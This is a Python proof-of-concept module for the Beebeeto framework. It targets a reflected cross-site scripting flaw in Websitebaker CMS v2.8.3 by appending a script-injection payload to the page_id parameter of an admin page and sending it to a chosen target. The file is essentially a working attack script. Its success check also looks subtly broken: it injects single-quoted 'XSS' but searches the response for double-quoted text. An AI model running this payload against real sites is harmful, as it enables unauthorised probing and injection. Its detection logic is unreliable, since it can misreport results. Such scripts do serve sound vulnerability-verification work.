#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0028',
            'name': 'Websitebaker CMS v2.8.3 Reflecting XSS vulnerability POC',
            'author': '塞万铁牛',
            'create_date': '2015-01-26',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Websitebaker CMS',
            'vul_version': ['v2.8.3'],
            'type': 'Cross-Site Scripting',
            'tag': ['Websitebaker CMS', 'XSS漏洞', 'modify.php?page_id=1', 'CVE-2015-0553'],
            'desc': '''
                    隐藏表单中引发的反射XSS漏洞
                    ''',
            'references': ['http://packetstormsecurity.com/files/130008/CMS-Websitebaker-2.8.3-SP3-Cross-Site-Scripting.html',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = '/admin/pages/modify.php?page_id=1%22><script>alert(%27XSS%27)</script><!--'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<script>alert("XSS")</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args
        
    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())